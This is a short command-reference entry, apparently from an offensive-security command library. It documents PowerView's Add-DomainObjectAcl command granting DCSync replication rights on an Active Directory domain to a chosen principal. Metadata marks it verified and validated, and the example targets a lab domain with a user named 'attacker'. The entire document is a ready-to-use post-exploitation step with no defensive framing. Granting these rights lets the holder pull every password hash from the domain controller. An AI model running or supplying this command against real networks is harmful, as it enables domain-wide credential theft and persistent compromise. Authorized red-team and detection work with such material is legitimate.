---
id: 9b62eb9b-123c-4268-a595-d73b8d2b0fae
name: powerview-add-dcsync-acl
type: command
executor: powershell
data: >-
  Add-DomainObjectAcl -TargetIdentity "DC=$_DOMAIN" -PrincipalIdentity $_USER
  -Rights DCSync -Credential $Cred
output: ACL modified.
created_at: '2020-03-16T00:35:46.225770+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - powerview
  - dcsync
verified: true
validated: true
---

# powerview-add-dcsync-acl

## Command

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=$_DOMAIN" -PrincipalIdentity $_USER -Rights DCSync -Credential $Cred
```

## Description

Grants DCSync rights via ACL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -TargetIdentity "DC=$_DOMAIN" | Target | Yes |
| -PrincipalIdentity $_USER | Principal | Yes |
| -Rights DCSync | Rights | Yes |
| -Credential $Cred | Creds | No |

## Examples

### Basic Usage

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=lab" -PrincipalIdentity attacker -Rights DCSync
```

## Expected Output

ACE added.
